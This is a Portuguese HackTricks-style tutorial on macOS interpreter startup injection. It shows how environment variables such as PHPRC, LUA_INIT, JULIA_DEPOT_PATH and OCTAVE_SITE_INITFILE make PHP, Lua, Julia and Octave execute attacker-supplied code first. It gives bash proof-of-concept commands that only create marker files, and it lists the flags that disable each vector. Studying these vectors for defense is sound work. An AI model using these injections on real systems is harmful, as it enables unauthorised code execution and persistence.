# Injeção de arquivo de inicialização de interpretadores do macOS

{{#include ../../../banners/hacktricks-training.md}}

Estas técnicas específicas de runtime usam variáveis de ambiente herdadas para selecionar uma configuração de inicialização ou código antes do script pretendido. Lua também oferece suporte a uma variante com código inline.

## Configuração de inicialização do PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` e `auto_prepend_file`

O PHP CLI e CGI leem a configuração a cada invocação. `PHPRC` pode selecionar um `php.ini` legível pelo atacante, enquanto `PHP_INI_SCAN_DIR` pode redirecionar o diretório pesquisado por arquivos `.ini` adicionais. A diretiva `auto_prepend_file` faz o PHP analisar um arquivo antes do script solicitado, permitindo que essa combinação execute código na inicialização.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Uma alternativa é um diretório que contém um arquivo `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

A opção `-n` ignora `php.ini`; um caminho confiável especificado com `-c` tem precedência sobre `PHPRC`. Lembre-se de que um SAPI de servidor de longa duração normalmente lê a configuração quando o servidor web é iniciado, enquanto CLI e CGI fazem isso a cada invocação.<sup>[[1]](#references)</sup>

## Código de inicialização do Lua

### `LUA_INIT`

Antes de processar as opções de linha de comando ou o script de destino, o interpretador Lua independente executa `LUA_INIT_<major>_<minor>` ou, se a variável com versão não estiver definida, `LUA_INIT`. Um valor que começa com `@` especifica um arquivo; qualquer outro valor é avaliado diretamente como código Lua. Isso permite a execução na inicialização tanto com arquivo quanto sem arquivo.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

O nome exato com versão varia conforme o interpretador, por exemplo, `LUA_INIT_5_4`. `lua -E` ignora todas as variáveis de ambiente, incluindo o código de inicialização e os caminhos dos módulos Lua.

## Depot de inicialização do Julia

### `JULIA_DEPOT_PATH` e `startup.jl`

Normalmente, o Julia executa `config/startup.jl` do primeiro depot durante a inicialização. `JULIA_DEPOT_PATH` controla a lista de depots; portanto, apontá-la para uma árvore que o atacante possa ler redireciona o arquivo de inicialização carregado automaticamente.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

O separador final é útil quando a vítima ainda precisa dos pacotes normais. `julia --startup-file=no` desativa esse arquivo de inicialização. Limpe a variável antes de iniciar, pois ela também controla registros de pacotes, ambientes, caches e locais de carregamento de código.

## Arquivos de inicialização do GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

O GNU Octave executa vários arquivos que contêm comandos Octave válidos durante a inicialização. `OCTAVE_SITE_INITFILE` substitui o arquivo de inicialização global do site, e `OCTAVE_VERSION_INITFILE` substitui o arquivo específico da versão, permitindo que qualquer uma das variáveis redirecione a execução automática para um arquivo legível pelo invasor.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` ignora apenas arquivos do usuário, como `~/.octaverc`; ele **não** impede a substituição do arquivo do site acima. Use `--no-site-file` para os arquivos do site ou `--norc` / `-f` para desativar todos os arquivos de inicialização.<sup>[[7]](#references)</sup>

## References

- [1] [Arquivo de configuração do PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Interpretador standalone do Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interface de linha de comando do Julia: arquivo de inicialização](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variáveis de ambiente do Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Arquivos de inicialização do GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opções de linha de comando do GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
